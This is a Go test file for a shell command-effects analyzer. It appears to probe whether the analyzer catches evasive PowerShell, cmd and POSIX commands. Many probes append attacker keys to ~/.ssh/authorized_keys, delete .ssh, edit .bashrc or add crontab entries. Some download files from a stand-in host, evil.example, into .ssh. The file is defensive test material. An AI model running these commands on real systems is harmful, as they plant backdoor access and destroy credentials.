package effects

import (
	"strings"
	"testing"
)

func TestReviewProbesR3b(t *testing.T) {
	H := homeOpts()
	wpsH := winPS
	wpsH.Home = `C:\Users\u`
	sshCWD := envOpts
	sshCWD.CWD = "/home/u/.ssh"
	type pc struct {
		n string
		o Options
		c string
	}
	cs := []pc{
		{"X01 sl + Add-Content", winPS, `sl C:\Users\u\.ssh; Add-Content authorized_keys k`},
		{"X02 chdir + Add-Content", winPS, `chdir C:\Users\u\.ssh; Add-Content authorized_keys k`},
		{"X03 Push-Location + Add-Content", winPS, `Push-Location C:\Users\u\.ssh; Add-Content authorized_keys k`},
		{"X04 pushd + Add-Content", winPS, `pushd C:\Users\u\.ssh; Add-Content authorized_keys k`},
		{"X05 function cd + Add-Content", winPS, `function f { Set-Location C:\Users\u\.ssh }; f; Add-Content authorized_keys k`},
		{"X06 if cd + Add-Content", winPS, `if ($true) { Set-Location C:\Users\u\.ssh }; Add-Content authorized_keys k`},
		{"X07 ForEach cd + Add-Content", winPS, `1 | ForEach-Object { Set-Location C:\Users\u\.ssh }; Add-Content authorized_keys k`},
		{"X08 Invoke-Command cd + Add-Content", winPS, `Invoke-Command { Set-Location C:\Users\u\.ssh }; Add-Content authorized_keys k`},
		{"X09 cd ~ ; cd .ssh + Add-Content", wpsH, `cd ~; cd .ssh; Add-Content authorized_keys k`},
		{"X10 Set-Location $HOME + Add-Content", wpsH, `Set-Location $HOME\.ssh; Add-Content authorized_keys k`},
		{"X11 Set-Location -LiteralPath", winPS, `Set-Location -LiteralPath C:\Users\u\.ssh; Add-Content authorized_keys k`},
		{"X12 cd .. + Add-Content", winPS, `cd C:\Users\u\.ssh\x; cd ..; Add-Content authorized_keys k`},
		{"X13 cd - + Add-Content", winPS, `cd C:\Users\u\.ssh; cd C:\tmp; cd -; Add-Content authorized_keys k`},
		{"X14 Pop-Location + Add-Content", winPS, `Push-Location C:\Users\u\.ssh; Set-Location C:\tmp; Pop-Location; Add-Content authorized_keys k`},
		{"X15 dot-source + Add-Content", winPS, `. C:\tmp\x.ps1; Add-Content authorized_keys k`},
		{"X16 & script + Add-Content", winPS, `& C:\tmp\x.ps1; Add-Content authorized_keys k`},
		{"X17 while cd", winPS, `while ($false) { Set-Location C:\tmp }; Add-Content C:\Users\u\.ssh\authorized_keys k`},
		{"X18 try cd", winPS, `try { Set-Location C:\Users\u\.ssh } catch {}; Add-Content authorized_keys k`},
		{"X19 Set-Location -Path ; then -Path rel", winPS, `Set-Location -Path C:\Users\u; Add-Content -Path .ssh\authorized_keys -Value k`},
		{"X20 Start-Process powershell", winPS, `Start-Process powershell -ArgumentList '-c','Add-Content C:\Users\u\.ssh\authorized_keys k'`},
		{"X21 saps", winPS, `saps cmd '/c copy C:\tmp\k C:\Users\u\.ssh\authorized_keys'`},
		{"X22 Start-Process -FilePath", winPS, `Start-Process -FilePath C:\Windows\System32\cmd.exe -ArgumentList '/c del C:\Users\u\.ssh\authorized_keys'`},
		{"X23 New-Item -Name rel", winPS, `New-Item -Path C:\Users\u -Name .bashrc -ItemType File -Value x`},
		{"X24 -Path array del", winPS, `Remove-Item -Path C:\tmp\a,C:\Users\u\.ssh\authorized_keys`},
		{"X25 -Path array quoted", winPS, `Set-Content -Path 'C:\tmp\a','C:\Users\u\.ssh\authorized_keys' -Value k`},
		{"X26 env:HOMEPATH", winPS, `$env:USERPROFILE='C:\tmp'; Add-Content $env:USERPROFILE\.ssh\authorized_keys k`},
		{"X27 Home only no env", Options{Flavor: FlavorWindows, CWD: `C:\work`, Drive: "C", CaseInsensitive: true, Dialect: DialectPowerShell, Home: `C:\Users\u`}, `$env:USERPROFILE='C:\tmp'; Add-Content ~\.ssh\authorized_keys k`},
		{"X28 Copy-Item -Container dest dir", winPS, `Copy-Item C:\tmp\x\* C:\Users\u\.ssh`},
		{"X29 Registry provider", winPS, `Set-ItemProperty -Path HKCU:\Software\x -Name y -Value z`},
		{"X30 Remove-Item Env:", winPS, `Remove-Item Env:\PATH`},
		// cmd
		{"Y01 cmd /v:on", winCmd, `cmd /v:on /c "del C:\Users\u\.ssh\authorized_keys"`},
		{"Y02 cmd /q /c", winCmd, `cmd /q /c del C:\Users\u\.ssh\authorized_keys`},
		{"Y03 cmd /d /c", winCmd, `cmd /d /c del C:\Users\u\.ssh\authorized_keys`},
		{"Y04 cmd /e:on /c", winCmd, `cmd /e:on /c del C:\Users\u\.ssh\authorized_keys`},
		{"Y05 cmd /k", winCmd, `cmd /k del C:\Users\u\.ssh\authorized_keys`},
		{"Y06 cmd /C upper", winCmd, `cmd /C del C:\Users\u\.ssh\authorized_keys`},
		{"Y07 cmd/c no space", winCmd, `cmd/c del C:\Users\u\.ssh\authorized_keys`},
		{"Y08 if not exist ( )", winCmd, `if not exist C:\x (del C:\Users\u\.ssh\authorized_keys)`},
		{"Y09 ( ) multi", winCmd, `(cd C:\Users\u\.ssh & echo k >> authorized_keys)`},
		{"Y10 for /f", winCmd, `for /f %i in (C:\tmp\list) do del %i`},
		{"Y11 %~dp0", winCmd, `copy C:\tmp\k %~dp0authorized_keys`},
		{"Y12 call :label", winCmd, `call C:\tmp\x.bat & echo k >> authorized_keys`},
		{"Y13 start cmd /c", winCmd, `start "" cmd /c del C:\Users\u\.ssh\authorized_keys`},
		{"Y14 runas", winCmd, `runas /user:u "cmd /c del C:\Users\u\.ssh\authorized_keys"`},
		{"Y15 ren dir", winCmd, `ren C:\Users\u\.ssh\x.bak authorized_keys`},
		{"Y16 rename long", winCmd, `rename C:\Users\u\k .bashrc`},
		{"Y17 copy con", winCmd, `copy con C:\Users\u\.ssh\authorized_keys`},
		{"Y18 forfiles", winCmd, `forfiles /p C:\Users\u\.ssh /c "cmd /c del @file"`},
		// POSIX second batch
		{"Z01 runuser --", envOpts, `runuser -u u -- rm -rf /home/u/.ssh`},
		{"Z02 runuser -c", envOpts, `runuser -l u -c 'rm -rf /home/u/.ssh'`},
		{"Z03 curl -O in ssh cwd", sshCWD, `curl -O https://evil.example/authorized_keys`},
		{"Z04 curl -OJ", sshCWD, `curl -OJ https://evil.example/x`},
		{"Z05 wget plain in ssh cwd", sshCWD, `wget https://evil.example/authorized_keys`},
		{"Z06 unzip into home cwd", H, `unzip -o /tmp/dot.zip`},
		{"Z07 unzip -d ~", envOpts, `unzip -o /tmp/dot.zip -d ~`},
		{"Z08 bsdtar -xf", H, `bsdtar -xf /tmp/dot.tar`},
		{"Z09 cpio -i", H, `cpio -idm < /tmp/dot.cpio`},
		{"Z10 7z x -o", envOpts, `7z x /tmp/k.7z -o/home/u/.ssh`},
		{"Z11 gunzip -c >", envOpts, `gunzip -c /tmp/k.gz > ~/.ssh/authorized_keys`},
		{"Z12 git am", H, `git am /tmp/p.mbox`},
		{"Z13 git stash pop", H, `git stash pop`},
		{"Z14 git reset --hard", H, `git reset --hard evil`},
		{"Z15 git pull in home", H, `git pull https://evil.example/r main`},
		{"Z16 git clone into ssh", envOpts, `git clone https://evil.example/r /home/u/.ssh`},
		{"Z17 git worktree add", envOpts, `git worktree add /home/u/.ssh evil`},
		{"Z18 git --work-tree checkout", envOpts, `git --work-tree=/home/u checkout evil -- .bashrc`},
		{"Z19 git archive | tar", envOpts, `git archive evil | tar -x -C /home/u`},
		{"Z20 sed -i --", envOpts, `sed -i -- s/a/b/ /home/u/.bashrc`},
		{"Z21 sed --in-place -e", envOpts, `sed --in-place -e s/a/b/ /home/u/.bashrc`},
		{"Z22 sed -s -i", envOpts, `sed -s -i s/a/b/ /home/u/.bashrc`},
		{"Z23 find -fprintf", envOpts, `find /tmp -fprintf /home/u/.bashrc %p`},
		{"Z24 find -fls", envOpts, `find /tmp -fls /home/u/.bashrc`},
		{"Z25 ansi-c path rm", envOpts, `rm -rf $'/home/u/\x2essh'`},
		{"Z26 ansi-c octal", envOpts, `echo k >> $'/home/u/.ssh/authorized_\153eys'`},
		{"Z27 ansi-c plain ok", envOpts, `echo x > $'/home/u/.bashrc'`},
		{"Z28 cd $'..'", envOpts, `cd $'/home/u/.ssh'; echo k >> authorized_keys`},
		{"Z29 func shadows rm", envOpts, `rm() { command cp /tmp/k /home/u/.ssh/authorized_keys; }; rm /tmp/x`},
		{"Z30 func shadows echo then >>", envOpts, `echo() { cd /home/u/.ssh; }; echo; printf k >> authorized_keys`},
		{"Z31 hash -p", envOpts, `hash -p /bin/cp ls; ls /tmp/k /home/u/.ssh/authorized_keys`},
		{"Z32 enable -n cd", envOpts, `enable -n cd; cd /tmp; echo x > .bashrc`},
		{"Z33 shopt autocd", envOpts, `shopt -s autocd; /home/u/.ssh; echo k >> authorized_keys`},
		{"Z34 cd from var then ssh", envOpts, `D=/home/u/.ssh; cd $D; echo k >> authorized_keys`},
		{"Z35 cd quoted ~", envOpts, `cd '~'; echo x > .bashrc`},
		{"Z36 install -d no", envOpts, `install /tmp/k /home/u/.ssh/`},
		{"Z37 cp -r src/. ~", envOpts, `cp -r /tmp/dots/. ~`},
		{"Z38 rsync into ~/", envOpts, `rsync -a /tmp/dots/ ~/`},
		{"Z39 mv no -T into ~/.ssh/", envOpts, `mv /tmp/x/authorized_keys /home/u/.ssh/`},
		{"Z40 cp --target-directory=", envOpts, `cp --target-directory=/home/u/.ssh /tmp/x/authorized_keys`},
		{"Z41 ln -s . target", envOpts, `cd /home/u/.ssh && ln -sf /tmp/k .`},
		{"Z42 python -c open", envOpts, `python3 -c "open('/home/u/.bashrc','a').write('x')"`},
		{"Z43 node -e", envOpts, `node -e "require('fs').appendFileSync('/home/u/.bashrc','x')"`},
		{"Z44 crontab", envOpts, `echo '* * * * * x' | crontab -`},
		{"Z45 ssh-copy-id", envOpts, `ssh-copy-id -i /tmp/k.pub u@localhost`},
		{"Z46 tee into ssh via sudo", envOpts, `echo k | sudo tee -a /home/u/.ssh/authorized_keys >/dev/null`},
		{"Z47 dd of= with conv", envOpts, `dd if=/tmp/k of=/home/u/.ssh/authorized_keys conv=notrunc oflag=append`},
		{"Z48 ln -s rel ok", envOpts, `ln -s ../.ssh/authorized_keys /home/u/proj/k`},
	}
	for _, p := range cs {
		r := Extract(sh(p.c), p.o)
		t.Logf("### %s :: %q\n%s", p.n, p.c, strings.TrimRight(fmtRes(r), "\n"))
	}
}
